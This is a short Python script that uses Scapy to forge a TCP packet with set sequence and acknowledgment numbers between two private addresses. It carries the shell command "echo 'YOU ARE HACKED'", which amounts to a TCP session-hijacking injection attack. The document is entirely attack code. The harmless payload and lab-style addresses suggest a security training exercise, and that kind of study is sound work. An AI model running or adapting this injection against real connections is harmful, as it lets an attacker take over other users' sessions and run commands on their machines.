from scapy.all import *

ip = IP(src="10.159.204.122", dst="10.159.204.123")
tcp = TCP(sport=53, 
           dport=50505,  
           flags="A",
           seq=323135827, 
           ack=1650758242)
data = "echo 'YOU ARE HACKED'"

pkt = ip/tcp/data
send(pkt)
